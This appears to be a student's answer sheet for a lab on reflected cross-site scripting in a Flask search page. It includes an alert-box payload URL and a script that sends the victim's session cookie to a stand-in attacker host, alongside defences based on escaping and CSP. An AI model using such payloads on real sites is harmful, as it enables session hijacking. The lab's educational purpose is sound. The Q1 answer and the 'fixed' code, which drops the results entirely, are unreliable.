## Lab 02: Cross-Site Scripting (XSS) Answers

### Q1. Vulnerable Line
**The exact line where user input enters the HTML is:**
```python
return render_template("search_results.html", results=results)
```

### Q2. Attacker Payload URL
**The URL to trigger an alert box would be:**
```text
http://localhost:5000/search?q=<script>alert('hacked')</script>
```

### Q3. Real-World Attacker Action
A real attacker would aim to steal sensitive session information. Instead of a simple alert, they would use `document.cookie` to send the victim's session cookie to a server they control.
**Example:**
```html
<script>
  fetch('https://attacker-collector.com/steal?cookie=' + document.cookie);
</script>
```
This allows the attacker to perform **Session Hijacking**, impersonating the user without needing their password.


### Q4. Fixed Code (Escaped HTML)
To fix this, we ensure the query parameter is escaped. This turns characters like `<` into `&lt;`, preventing the browser from executing them as code.

```python
from markupsafe import escape

@app.route("/search", methods=["GET"])
def search():
    """Display search results for a query parameter q safely."""
    query = request.args.get("q", "")
    
    safe_query = escape(query)
    
    db = get_db()
    cur = db.execute("SELECT * FROM invoices WHERE details LIKE ?", ('%' + query + '%',))
    results = cur.fetchall()
    
    return f"<h1>Results for {safe_query}</h1>" 
```


### Q5. Protective HTTP Header
One additional header that provides a powerful layer of defense is:
**`Content-Security-Policy` (CSP)**

Specifically, a policy like `Content-Security-Policy: default-src 'self';` tells the browser only to execute scripts originating from the website's own domain, blocking any inline scripts injected by an attacker.
